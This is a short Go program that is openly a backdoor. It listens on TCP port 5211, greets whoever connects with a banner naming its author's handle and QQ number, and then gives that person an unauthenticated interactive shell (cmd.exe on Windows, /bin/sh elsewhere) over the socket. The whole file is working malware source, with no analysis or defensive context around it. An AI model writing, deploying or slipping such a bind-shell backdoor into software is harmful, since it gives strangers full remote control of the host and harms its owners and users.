package main

import (
	"net"
	"os/exec"
	"runtime"
)

var left = "[+] Connect backdoor success,press enter to join the shell :):"

func main() {
	var cmd *exec.Cmd
	ln, err := net.Listen("tcp", ":5211")
	buffRecv := make([]byte, 128)
	if err != nil {
		err.Error()
	}
	for {
		conn, err := ln.Accept()
		showMSG(conn)
		if err != nil {
			continue
		}
		c := []byte(left)
		for {
			conn.Write(c)
			length, err := conn.Read(buffRecv)
			if length == 10 {
			}
			if err != nil {
			}
			//fmt recf
			switch runtime.GOOS {
			case "windows":
				cmd = exec.Command("cmd.exe")
			default:
				cmd = exec.Command("/bin/sh")
			}
			cmd.Stdin = conn
			cmd.Stdout = conn
			cmd.Stderr = conn
			cmd.Run()
			buffRecv = make([]byte, 128)
		}
	}
}

func showMSG(conn net.Conn) {
	msg := "\t\t\twelcome to lucifer11(QQ:1185151867)'s backdoor[default port:5211]\t\t\n"
	m := []byte(msg)
	conn.Write(m)
}
